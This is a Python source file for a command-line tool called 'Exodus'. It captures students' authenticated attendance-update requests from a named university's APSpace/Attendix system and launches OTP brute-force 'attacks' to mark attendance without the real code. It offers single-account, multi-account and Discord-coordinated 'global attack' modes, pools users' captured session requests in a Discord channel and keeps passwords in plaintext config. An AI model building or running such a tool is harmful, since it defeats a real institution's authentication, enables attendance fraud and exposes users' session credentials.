import os
import time
import tkinter as tk
from tkinter import filedialog
import webbrowser
import ui
import attacker
import discord_db
import global_attack

# ================= Setup ================= #
os.system("title Exodus.exe")

APSPACE_ATTENDIX_URL = "https://apspace.apu.edu.my/attendix/update"
GRAPHQL_ENDPOINT = "https://attendix.apu.edu.my/graphql"

def auto_grab_curl():
    """
    Automatically captures cURL request using Playwright browser automation.
    Opens browser, user logs in and submits OTP, system captures the request.
    """
    ui.clear()
    print(ui.font(" Auto-Grab cURL (Automated) ", color="cyan", inverse=True))
    
    # Check if playwright is available
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print(ui.font("\n [!] Playwright not installed.", color="red"))
        print(ui.font(" Installing Playwright... (this may take a minute)", color="yellow"))
        
        import subprocess
        try:
            subprocess.run(["pip", "install", "playwright"], check=True)
            subprocess.run(["playwright", "install", "chromium"], check=True)
            from playwright.sync_api import sync_playwright
            print(ui.font(" [SUCCESS] Playwright installed!", color="green"))
        except Exception as e:
            print(ui.font(f"\n [ERROR] Could not install Playwright: {e}", color="red"))
            print(ui.font(" Please run: pip install playwright && playwright install chromium", color="yellow"))
            input("\n Press Enter to return to menu...")
            return
    
    print(ui.font("\n HOW THIS WORKS:", color="yellow", bold=True))
    print("""
 1. A browser window will open to APSpace.
 2. Log in with your APU credentials.
 3. Navigate to the Attendix Update page (if not already there).
 4. Enter ANY OTP (e.g., 000) and click Verify.
 5. The cURL will be AUTOMATICALLY captured and saved!

 NOTE: The request will fail (wrong OTP) but that's expected.
       We just need to capture the request format.
""")
    
    # Always save as single config for simplicity
    input_dir = os.path.join(os.getcwd(), 'Input')
    if not os.path.exists(input_dir):
        os.makedirs(input_dir)
    save_path = os.path.join(input_dir, 'temp.txt')
    
    print(ui.font("\n [*] Opening browser... Please log in and submit an OTP.", color="cyan"))
    print(ui.font(" [*] The browser will close automatically once captured.", color="cyan"))
    
    captured_curl = [None]  # Use list to allow modification in closure
    
    def build_curl_from_request(request):
        """Convert Playwright request to cURL bash format"""
        url = request.url
        method = request.method
        headers = request.headers
        post_data = request.post_data
        
        curl_parts = [f"curl '{url}'"]
        
        for key, value in headers.items():
            # Skip some headers that are auto-generated
            if key.lower() in ['content-length', 'host']:
                continue
            curl_parts.append(f"  -H '{key}: {value}'")
        
        if post_data:
            curl_parts.append(f"  --data-raw '{post_data}'")
        
        return " \\\n".join(curl_parts)
    
    try:
        with sync_playwright() as p:
            # Try to use user's installed browser (Chrome first, then Edge)
            browser = None
            browser_name = None
            
            # Try Chrome first (most common)
            try:
                browser = p.chromium.launch(headless=False, channel="chrome")
                browser_name = "Chrome"
            except Exception:
                pass
            
            # Fallback to Edge (comes pre-installed on Windows)
            if browser is None:
                try:
                    browser = p.chromium.launch(headless=False, channel="msedge")
                    browser_name = "Edge"
                except Exception:
                    pass
            
            # Last resort: use bundled Chromium
            if browser is None:
                print(ui.font(" [!] No Chrome/Edge found. Using bundled Chromium...", color="yellow"))
                browser = p.chromium.launch(headless=False)
                browser_name = "Chromium"
            else:
                print(ui.font(f" [*] Using your installed {browser_name} browser", color="green"))
            
            context = browser.new_context()
            page = context.new_page()
            
            # Intercept requests to graphql endpoint
            def handle_request(request):
                if GRAPHQL_ENDPOINT in request.url and request.method == "POST":
                    # Check if it's the updateAttendance mutation
                    post_data = request.post_data
                    if post_data and "updateAttendance" in post_data:
                        captured_curl[0] = build_curl_from_request(request)
                        print(ui.font("\n [SUCCESS] cURL request captured!", color="green", inverse=True))
            
            page.on("request", handle_request)
            
            # Navigate to APSpace
            page.goto(APSPACE_ATTENDIX_URL)
            
            print(ui.font("\n [*] Waiting for you to log in and submit an OTP...", color="yellow"))
            print(ui.font(" [*] (Browser will auto-close after capture)", color="yellow"))
            
            # Wait until we capture the request or user closes browser
            while captured_curl[0] is None:
                try:
                    page.wait_for_timeout(500)  # Check every 500ms
                except:
                    break  # Browser was closed
            
            browser.close()
            
    except Exception as e:
        print(ui.font(f"\n [ERROR] Browser automation failed: {e}", color="red"))
        input("\n Press Enter to return to menu...")
        return
    
    # Save the captured cURL
    if captured_curl[0]:
        try:
            with open(save_path, 'w', encoding='utf-8') as f:
                f.write(captured_curl[0])
            
            print(ui.font(f"\n [SUCCESS] cURL saved to: {save_path}", color="green", inverse=True))
            print(ui.font(" You can now use the bruteforce options!", color="cyan"))
        except Exception as e:
            print(ui.font(f"\n [ERROR] Failed to save: {e}", color="red"))
            print(ui.font("\n Captured cURL (copy manually if needed):", color="yellow"))
            print(captured_curl[0])
    else:
        print(ui.font("\n [!] No request was captured.", color="yellow"))
        print(ui.font(" Make sure you submitted an OTP on the Attendix page.", color="white"))
    
    input("\n Press Enter to return to menu...")

def single_account_menu():
    """Single Account submenu - attack and setup for single user"""
    while True:
        ui.clear()
        print(ui.font("         - Single Account Mode -         \n", color="cyan", inverse=True))
        
        ui.enter_effect([
            "1. Start Attack",
            "2. Multi-Threaded Attack",
            "3. Test Connection",
            "4. Setup cURL (Auto-Grab)",
            "5. Setup cURL (Import File)",
            "6. Back"
        ], delay=0.02, symbol="█")
        choice = input("\nInput: ")
        
        if choice == "1":
            ui.bg()
            attacker.start()
            ui.bg_end()
        elif choice == "2":
            ui.bg()
            attacker.start_experimental()
            ui.bg_end()
        elif choice == "3":
            ui.bg()
            attacker.test_connection()
            ui.bg_end()
        elif choice == "4":
            auto_grab_curl()
        elif choice == "5":
            # Import cURL from file
            ui.clear()
            print(ui.font(" Import cURL ", color="yellow", inverse=True))
            
            input_dir = os.path.join(os.getcwd(), 'Input')
            if not os.path.exists(input_dir):
                os.makedirs(input_dir)
                
            file_path = os.path.join(input_dir, 'temp.txt')
            
            if os.path.exists(file_path):
                print(f"\n [INFO] Configuration file already exists.")
                print(ui.font(" 1. Overwrite existing cURL", color="cyan"))
                print(ui.font(" 2. Cancel", color="white"))
                sub_choice = input("\n Input: ")
                if sub_choice != "1":
                    continue
            else:
                print(f"\n [INFO] No configuration found. Please select a file.")

            print(ui.font("\n Press Enter to browse for your cURL text file...", color="green"))
            input()
            
            root = tk.Tk()
            root.withdraw()
            root.attributes('-topmost', True)
            
            file_selected = filedialog.askopenfilename(
                title="Select cURL Text File",
                filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
            )
            
            if file_selected:
                try:
                    with open(file_selected, "r", encoding="utf-8") as f:
                        new_curl = f.read().strip()
                        
                    if new_curl:
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(new_curl)
                        print(ui.font(f"\n [SUCCESS] Loaded config from {os.path.basename(file_selected)}", color="green", inverse=True))
                    else:
                        print(ui.font("\n [!] Selected file is empty.", color="yellow"))
                        
                except Exception as e:
                     print(ui.font(f"\n [ERROR] Failed to read file: {e}", color="red"))
            else:
                print(ui.font("\n [!] No file selected.", color="yellow"))
            
            time.sleep(2)
            
        elif choice == "6":
            break
        else:
            print(ui.font(" Invalid Option. Please key in 1-6", color="red"))
            time.sleep(1)

def multi_account_menu():
    """Multiple Account submenu - attack and manage accounts"""
    while True:
        ui.clear()
        print(ui.font("        - Multiple Account Mode -        \n", color="magenta", inverse=True))
        
        # Show account count
        saved_dir = os.path.join(os.getcwd(), 'Input', 'SavedRequests')
        if not os.path.exists(saved_dir):
            os.makedirs(saved_dir)
        files = [f for f in os.listdir(saved_dir) if f.endswith(".txt")]
        
        print(ui.font(f" Accounts Loaded: {len(files)}", color="white"))
        
        ui.enter_effect([
            "",
            "1. Start Attack",
            "2. Manage Accounts",
            "3. Back"
        ], delay=0.02, symbol="█")
        choice = input("\nInput: ")
        
        if choice == "1":
            if len(files) == 0:
                print(ui.font("\n [!] No accounts configured. Add accounts first.", color="yellow"))
                time.sleep(2)
                continue
            
            # Account selection submenu
            ui.clear()
            print(ui.font(" Select Accounts for Attack ", color="magenta", inverse=True))
            print(f"\n Available Accounts ({len(files)}):\n")
            
            for i, f in enumerate(files):
                print(f"  {i+1}. {os.path.splitext(f)[0]}")
            
            print("\n" + "-"*35)
            print(ui.font(" a. Use ALL accounts", color="cyan"))
            print(ui.font(" s. Select specific accounts", color="yellow"))
            print(ui.font(" b. Back", color="white"))
            
            select_choice = input("\n Input: ").strip().lower()
            
            if select_choice == "b":
                continue
            elif select_choice == "a":
                # Use all accounts
                selected_files = files
            elif select_choice == "s":
                # Select specific accounts
                print(ui.font("\n Enter account numbers separated by commas (e.g., 1,3,4):", color="yellow"))
                print(ui.font(" Or enter a range (e.g., 1-5):", color="yellow"))
                selection = input(" Selection: ").strip()
                
                selected_indices = set()
                try:
                    # Parse comma-separated values and ranges
                    parts = selection.split(",")
                    for part in parts:
                        part = part.strip()
                        if "-" in part:
                            # Range (e.g., 1-5)
                            start, end = part.split("-")
                            for idx in range(int(start), int(end) + 1):
                                if 1 <= idx <= len(files):
                                    selected_indices.add(idx - 1)
                        else:
                            # Single number
                            idx = int(part)
                            if 1 <= idx <= len(files):
                                selected_indices.add(idx - 1)
                    
                    if not selected_indices:
                        print(ui.font("\n [!] No valid accounts selected.", color="red"))
                        time.sleep(1.5)
                        continue
                    
                    selected_files = [files[i] for i in sorted(selected_indices)]
                    
                except ValueError:
                    print(ui.font("\n [!] Invalid input format.", color="red"))
                    time.sleep(1.5)
                    continue
            else:
                print(ui.font("\n [!] Invalid option.", color="red"))
                time.sleep(1)
                continue
            
            # Show selected accounts
            ui.clear()
            print(ui.font(" Selected Accounts ", color="green", inverse=True))
            print(f"\n Attacking with {len(selected_files)} account(s):\n")
            for f in selected_files:
                print(f"  • {os.path.splitext(f)[0]}")
            
            confirm = input("\n Proceed? (y/n): ").strip().lower()
            if confirm != 'y':
                continue
            
            ui.bg()
            attacker.run_multi_account_attack(selected_files)
            ui.bg_end()
            
        elif choice == "2":
            # Manage accounts submenu
            while True:
                ui.clear()
                print(ui.font(" Manage Accounts ", color="magenta", inverse=True))
                
                files = [f for f in os.listdir(saved_dir) if f.endswith(".txt")]
                
                print(f"\n Saved Accounts ({len(files)}):")
                if not files:
                    print("  (None)")
                else:
                    for i, f in enumerate(files):
                        print(f"  {i+1}. {os.path.splitext(f)[0]}")
                        
                print("\n" + "-"*30)
                print(" 1. Add Account")
                print(" 2. Rename Account")
                print(" 3. Delete Account")
                print(" 4. Back")
                
                sub_choice = input("\n Input: ")
                
                if sub_choice == "1":
                    print(ui.font("\n Press Enter to browse for cURL file...", color="green"))
                    input()
                    root = tk.Tk()
                    root.withdraw()
                    root.attributes('-topmost', True)
                    
                    file_selected = filedialog.askopenfilename(title="Select cURL Text File")
                    if file_selected:
                        dest_name = input(" Enter account name: ").strip()
                        if not dest_name:
                            print(ui.font(" Invalid name.", color="red"))
                            time.sleep(1)
                            continue
                        
                        if not dest_name.endswith(".txt"):
                            dest_name += ".txt"
                            
                        dest_path = os.path.join(saved_dir, dest_name)
                        
                        try:
                            with open(file_selected, 'r', encoding='utf-8') as fin:
                                content = fin.read()
                            with open(dest_path, 'w', encoding='utf-8') as fout:
                                fout.write(content)
                            print(ui.font(f"\n [SUCCESS] Added {os.path.splitext(dest_name)[0]}", color="green"))
                        except Exception as e:
                            print(ui.font(f" [ERROR] {e}", color="red"))
                        time.sleep(1.5)
                        
                elif sub_choice == "2":
                    if not files:
                        print(ui.font(" No accounts to rename.", color="yellow"))
                        time.sleep(1)
                        continue
                    try:
                        idx = int(input(" Enter number to rename: ")) - 1
                        if 0 <= idx < len(files):
                            old_name = files[idx]
                            new_name = input(f" New name: ").strip()
                            if new_name:
                                if not new_name.endswith(".txt"):
                                    new_name += ".txt"
                                
                                old_path = os.path.join(saved_dir, old_name)
                                new_path = os.path.join(saved_dir, new_name)
                                os.rename(old_path, new_path)
                                print(ui.font(" [SUCCESS] Renamed.", color="green"))
                            else:
                                print(" Cancelled.")
                        else:
                            print(" Invalid number.")
                    except ValueError:
                        print(" Invalid input.")
                    time.sleep(1)
                    
                elif sub_choice == "3":
                    if not files:
                        print(ui.font(" No accounts to delete.", color="yellow"))
                        time.sleep(1)
                        continue
                    try:
                        idx = int(input(" Enter number to delete: ")) - 1
                        if 0 <= idx < len(files):
                            target = files[idx]
                            confirm = input(f" Delete '{os.path.splitext(target)[0]}'? (y/n): ").lower()
                            if confirm == 'y':
                                os.remove(os.path.join(saved_dir, target))
                                print(ui.font(" [SUCCESS] Deleted.", color="green"))
                            else:
                                print(" Cancelled.")
                        else:
                            print(" Invalid number.")
                    except ValueError:
                        print(" Invalid input.")
                    time.sleep(1)
                    
                elif sub_choice == "4":
                    break
            
        elif choice == "3":
            break
        else:
            print(ui.font(" Invalid Option. Please key in 1-3", color="red"))
            time.sleep(1)

def discord_menu():
    """Discord Webhook Database - Experimental Feature"""
    while True:
        ui.clear()
        print(ui.font("    - Discord Webhook (Experimental) -    \n", color="blue", inverse=True))
        
        # Check if webhook is configured
        config = discord_db.load_webhook_config()
        if config:
            print(ui.font(" [✓] Webhook Configured", color="green"))
        else:
            print(ui.font(" [!] No webhook configured", color="yellow"))
        
        ui.enter_effect([
            "",
            "1. Setup Webhook",
            "2. Test Connection",
            "3. Backup All Accounts",
            "4. Send Test Notification",
            "5. Back"
        ], delay=0.02, symbol="█")
        choice = input("\nInput: ")
        
        if choice == "1":
            ui.clear()
            print(ui.font(" Setup Discord Webhook ", color="blue", inverse=True))
            print("\n HOW TO GET WEBHOOK URL:")
            print(" 1. Open Discord")
            print(" 2. Go to Server Settings > Integrations > Webhooks")
            print(" 3. Create a new webhook or use existing one")
            print(" 4. Copy the webhook URL\n")
            
            if config:
                print(ui.font(" Current webhook is already configured.", color="yellow"))
                print(" 1. Update webhook")
                print(" 2. Cancel")
                sub = input("\n Input: ")
                if sub != "1":
                    continue
            
            webhook_url = input(" Paste webhook URL: ").strip()
            
            if webhook_url.startswith("https://discord.com/api/webhooks/") or webhook_url.startswith("https://discordapp.com/api/webhooks/"):
                if discord_db.save_webhook_config(webhook_url):
                    print(ui.font("\n [SUCCESS] Webhook saved!", color="green", inverse=True))
                else:
                    print(ui.font("\n [ERROR] Failed to save webhook.", color="red"))
            else:
                print(ui.font("\n [ERROR] Invalid webhook URL format.", color="red"))
            
            time.sleep(2)
            
        elif choice == "2":
            if not config:
                print(ui.font("\n [!] Configure webhook first.", color="yellow"))
                time.sleep(1.5)
                continue
                
            print(ui.font("\n Testing webhook...", color="cyan"))
            success, _ = discord_db.test_webhook(config['webhook_url'])
            
            if success:
                print(ui.font(" [SUCCESS] Webhook is working!", color="green", inverse=True))
            else:
                print(ui.font(" [ERROR] Webhook test failed.", color="red"))
            
            input("\n Press Enter to continue...")
            
        elif choice == "3":
            if not config:
                print(ui.font("\n [!] Configure webhook first.", color="yellow"))
                time.sleep(1.5)
                continue
            
            print(ui.font("\n Backing up all accounts to Discord...", color="cyan"))
            count, msg = discord_db.backup_all_accounts(config['webhook_url'])
            print(ui.font(f"\n {msg}", color="green" if count > 0 else "yellow"))
            
            input("\n Press Enter to continue...")
            
        elif choice == "4":
            if not config:
                print(ui.font("\n [!] Configure webhook first.", color="yellow"))
                time.sleep(1.5)
                continue
            
            test_otp = input("\n Enter test OTP (e.g. 123): ").strip() or "000"
            print(ui.font(" Sending notification...", color="cyan"))
            success, _ = discord_db.send_otp_notification(config['webhook_url'], test_otp, "Test Account")
            
            if success:
                print(ui.font(" [SUCCESS] Notification sent!", color="green", inverse=True))
            else:
                print(ui.font(" [ERROR] Failed to send.", color="red"))
            
            input("\n Press Enter to continue...")
            
        elif choice == "5":
            break
        else:
            print(ui.font(" Invalid Option.", color="red"))
            time.sleep(1)

def global_attack_menu():
    """Global Attack Mode - Collaborative attacks via Discord"""
    while True:
        ui.clear()
        print(ui.font("       - Global Attack (Experimental) -       \n", color="yellow", inverse=True))
        
        # Check current session
        config = global_attack.load_global_config()
        logged_in = config and config.get('logged_in_user')
        has_setup = config and config.get('data_webhook') and config.get('channel_id') and config.get('bot_token')
        
        if logged_in:
            print(ui.font(f" Logged in as: {config['logged_in_user']}", color="green"))
        else:
            print(ui.font(" Not logged in", color="yellow"))
        
        if has_setup:
            print(ui.font(" [✓] Discord configured", color="green"))
        else:
            print(ui.font(" [!] Discord not configured", color="yellow"))
        
        ui.enter_effect([
            "",
            "1. Setup Discord (First Time)",
            "2. Register Account", 
            "3. Login",
            "4. Update My cURL",
            "5. Start Global Attack",
            "6. View Connected Users",
            "7. Logout",
            "8. Back"
        ], delay=0.02, symbol="█")
        choice = input("\nInput: ")
        
        if choice == "1":
            # Setup Discord bot and webhook
            ui.clear()
            print(ui.font(" Setup Discord Connection ", color="yellow", inverse=True))
            print("\n You need 2 Discord channels:")
            print(ui.font(" 1. DATA Channel", color="cyan") + " (private, admin only) - stores user configs")
            print(ui.font(" 2. NOTIFY Channel", color="green") + " (public, members can see) - attack alerts\n")
            
            print(" REQUIREMENTS:")
            print(" • Data Channel: Webhook + Channel ID + Bot with read access")
            print(" • Notify Channel: Webhook only (for alerts)\n")
            
            print(ui.font(" --- DATA CHANNEL (Private) ---", color="cyan"))
            data_webhook = input(" Data Webhook URL: ").strip()
            if not (data_webhook.startswith("https://discord.com/api/webhooks/") or data_webhook.startswith("https://discordapp.com/api/webhooks/")):
                print(ui.font("\n [ERROR] Invalid webhook URL", color="red"))
                time.sleep(2)
                continue
            
            channel_id = input(" Data Channel ID: ").strip()
            if not channel_id.isdigit():
                print(ui.font("\n [ERROR] Invalid channel ID", color="red"))
                time.sleep(2)
                continue
            
            bot_token = input(" Bot Token: ").strip()
            if not bot_token:
                print(ui.font("\n [ERROR] Bot token required", color="red"))
                time.sleep(2)
                continue
            
            print(ui.font("\n --- NOTIFY CHANNEL (Public) ---", color="green"))
            notify_webhook = input(" Notify Webhook URL (or press Enter to skip): ").strip()
            if notify_webhook and not (notify_webhook.startswith("https://discord.com/api/webhooks/") or notify_webhook.startswith("https://discordapp.com/api/webhooks/")):
                print(ui.font("\n [ERROR] Invalid webhook URL", color="red"))
                time.sleep(2)
                continue
            
            # Test connection
            print(ui.font("\n Testing data channel connection...", color="cyan"))
            success, msg = global_attack.test_bot_connection(channel_id, bot_token)
            
            if success:
                config = config or {}
                config['data_webhook'] = data_webhook
                config['notify_webhook'] = notify_webhook if notify_webhook else None
                config['channel_id'] = channel_id
                config['bot_token'] = bot_token
                # Keep old 'webhook_url' for backwards compatibility
                config['webhook_url'] = data_webhook
                global_attack.save_global_config(config)
                print(ui.font(f" [SUCCESS] Connected! {msg}", color="green", inverse=True))
                if notify_webhook:
                    print(ui.font(" [✓] Notify channel configured", color="green"))
                else:
                    print(ui.font(" [!] No notify channel (alerts will go to data channel)", color="yellow"))
            else:
                print(ui.font(f" [ERROR] {msg}", color="red"))
            
            time.sleep(2)
            
        elif choice == "2":
            # Register new account
            if not has_setup:
                print(ui.font("\n [!] Setup Discord first (Option 1)", color="yellow"))
                time.sleep(1.5)
                continue
            
            ui.clear()
            print(ui.font(" Register New Account ", color="green", inverse=True))
            
            username = input("\n Username: ").strip()
            if not username or len(username) < 3:
                print(ui.font(" [ERROR] Username must be at least 3 characters", color="red"))
                time.sleep(1.5)
                continue
            
            password = input(" Password: ").strip()
            if not password or len(password) < 4:
                print(ui.font(" [ERROR] Password must be at least 4 characters", color="red"))
                time.sleep(1.5)
                continue
            
            confirm = input(" Confirm Password: ").strip()
            if password != confirm:
                print(ui.font(" [ERROR] Passwords don't match", color="red"))
                time.sleep(1.5)
                continue
            
            # Get cURL
            print(ui.font("\n Now import your cURL:", color="cyan"))
            print(" Press Enter to browse for your cURL file...")
            input()
            
            root = tk.Tk()
            root.withdraw()
            root.attributes('-topmost', True)
            
            file_path = filedialog.askopenfilename(title="Select cURL Text File")
            if not file_path:
                print(ui.font(" [!] Cancelled", color="yellow"))
                time.sleep(1)
                continue
            
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    curl_data = f.read().strip()
            except Exception as e:
                print(ui.font(f" [ERROR] {e}", color="red"))
                time.sleep(2)
                continue
            
            # Register
            print(ui.font("\n Registering...", color="cyan"))
            success = global_attack.register_user(
                config['data_webhook'], 
                username, 
                password, 
                curl_data,
                config.get('notify_webhook')
            )
            
            if success:
                config['logged_in_user'] = username
                config['logged_in_pass'] = password
                global_attack.save_global_config(config)
                print(ui.font(f"\n [SUCCESS] Registered as {username}!", color="green", inverse=True))
            else:
                print(ui.font(" [ERROR] Registration failed", color="red"))
            
            time.sleep(2)
            
        elif choice == "3":
            # Login
            if not has_setup:
                print(ui.font("\n [!] Setup Discord first (Option 1)", color="yellow"))
                time.sleep(1.5)
                continue
            
            ui.clear()
            print(ui.font(" Login ", color="cyan", inverse=True))
            
            username = input("\n Username: ").strip()
            password = input(" Password: ").strip()
            
            print(ui.font("\n Fetching users...", color="cyan"))
            messages, err = global_attack.fetch_channel_messages(config['channel_id'], config['bot_token'])
            
            if err:
                print(ui.font(f" [ERROR] {err}", color="red"))
                time.sleep(2)
                continue
            
            users = global_attack.parse_users_from_messages(messages)
            valid, user_data = global_attack.authenticate_user(users, username, password)
            
            if valid:
                config['logged_in_user'] = username
                config['logged_in_pass'] = password
                global_attack.save_global_config(config)
                print(ui.font(f"\n [SUCCESS] Welcome back, {username}!", color="green", inverse=True))
            else:
                print(ui.font(" [ERROR] Invalid credentials", color="red"))
            
            time.sleep(2)
            
        elif choice == "4":
            # Update cURL
            if not logged_in:
                print(ui.font("\n [!] Login first", color="yellow"))
                time.sleep(1.5)
                continue
            
            ui.clear()
            print(ui.font(" Update Your cURL ", color="cyan", inverse=True))
            print(" Press Enter to browse for new cURL file...")
            input()
            
            root = tk.Tk()
            root.withdraw()
            root.attributes('-topmost', True)
            
            file_path = filedialog.askopenfilename(title="Select cURL Text File")
            if not file_path:
                print(ui.font(" [!] Cancelled", color="yellow"))
                time.sleep(1)
                continue
            
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    curl_data = f.read().strip()
            except Exception as e:
                print(ui.font(f" [ERROR] {e}", color="red"))
                time.sleep(2)
                continue
            
            print(ui.font("\n Updating...", color="cyan"))
            success = global_attack.update_user_curl(
                config['data_webhook'], 
                config['logged_in_user'], 
                config['logged_in_pass'], 
                curl_data,
                config.get('notify_webhook')
            )
            
            if success:
                print(ui.font(" [SUCCESS] cURL updated!", color="green", inverse=True))
            else:
                print(ui.font(" [ERROR] Update failed", color="red"))
            
            time.sleep(2)
            
        elif choice == "5":
            # Start Global Attack
            if not logged_in:
                print(ui.font("\n [!] Login first", color="yellow"))
                time.sleep(1.5)
                continue
            
            ui.clear()
            print(ui.font(" Starting Global Attack ", color="red", inverse=True))
            
            # Fetch all users
            print(ui.font("\n Fetching all connected users...", color="cyan"))
            messages, err = global_attack.fetch_channel_messages(config['channel_id'], config['bot_token'])
            
            if err:
                print(ui.font(f" [ERROR] {err}", color="red"))
                time.sleep(2)
                continue
            
            users = global_attack.parse_users_from_messages(messages)
            user_curls = global_attack.get_all_user_curls(users)
            
            if not user_curls:
                print(ui.font(" [!] No users found with valid configs", color="yellow"))
                time.sleep(2)
                continue
            
            print(ui.font(f"\n Found {len(user_curls)} user(s):", color="green"))
            for u in user_curls:
                print(f"  • {u['username']}")
            
            # Attack settings
            try:
                thread_input = input("\n Threads per user (default 4): ")
                num_threads = int(thread_input) if thread_input.strip() else 4
            except:
                num_threads = 4
            
            try:
                cooldown_input = input(" Cooldown per thread (default 0.5): ")
                cooldown = float(cooldown_input) if cooldown_input.strip() else 0.5
            except:
                cooldown = 0.5
            
            confirm = input("\n Launch Global Attack? (y/n): ").strip().lower()
            if confirm != 'y':
                continue
            
            # Notify Discord (use notify webhook if available, otherwise data webhook)
            notify_webhook = config.get('notify_webhook') or config.get('data_webhook')
            global_attack.send_attack_notification(
                notify_webhook, 
                config['logged_in_user'], 
                len(user_curls)
            )
            
            # Prepare files for multi-attack
            # Save user curls temporarily
            temp_dir = os.path.join(os.getcwd(), 'Input', 'GlobalTemp')
            if not os.path.exists(temp_dir):
                os.makedirs(temp_dir)
            
            # Clear old temp files
            for f in os.listdir(temp_dir):
                os.remove(os.path.join(temp_dir, f))
            
            temp_files = []
            for u in user_curls:
                filename = f"{u['username']}.txt"
                filepath = os.path.join(temp_dir, filename)
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(u['curl'])
                temp_files.append(filename)
            
            # Run attack using modified multi-account attack
            print(ui.font("\n GLOBAL ATTACK STARTED!", color="red", inverse=True))
            print(ui.font(" Press 'q' or 'esc' to stop all attacks.\n", color="yellow"))
            
            ui.bg()
            # Pass notify webhook for OTP found alerts
            attacker.run_global_attack(temp_files, temp_dir, num_threads, cooldown, notify_webhook)
            ui.bg_end()
            
        elif choice == "6":
            # View connected users
            if not has_setup:
                print(ui.font("\n [!] Setup Discord first", color="yellow"))
                time.sleep(1.5)
                continue
            
            ui.clear()
            print(ui.font(" Connected Users ", color="cyan", inverse=True))
            
            messages, err = global_attack.fetch_channel_messages(config['channel_id'], config['bot_token'])
            
            if err:
                print(ui.font(f"\n [ERROR] {err}", color="red"))
            else:
                users = global_attack.parse_users_from_messages(messages)
                print(f"\n Found {len(users)} user(s):\n")
                for i, username in enumerate(users.keys()):
                    print(f"  {i+1}. {username}")
            
            input("\n Press Enter to continue...")
            
        elif choice == "7":
            # Logout
            if logged_in:
                config['logged_in_user'] = None
                config['logged_in_pass'] = None
                global_attack.save_global_config(config)
                print(ui.font("\n Logged out.", color="green"))
            else:
                print(ui.font("\n Not logged in.", color="yellow"))
            time.sleep(1)
            
        elif choice == "8":
            break
        else:
            print(ui.font(" Invalid Option.", color="red"))
            time.sleep(1)

def main_menu():
    """Main menu with simplified options"""
    while True:
        ui.clear()
        print(ui.font("                - Exodus -                \n", color="white", inverse=True))
        
        ui.enter_effect([
            "1. Single Account",
            "2. Multiple Account",
            "3. Global Attack (Cloud)",
            "4. Discord Webhook",
            "5. Exit"
        ], delay=0.02, symbol="█")
        choice = input("\nInput: ")

        if choice == "1":
            single_account_menu()
        elif choice == "2":
            multi_account_menu()
        elif choice == "3":
            global_attack_menu()
        elif choice == "4":
            discord_menu()
        elif choice == "5":
            ui.clear()
            print(ui.font(" ", color="red", inverse=True) + " Exit Successful.")
            break
        else:
            print(ui.font(" Invalid Option. Please key in 1-5", color="red"))
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
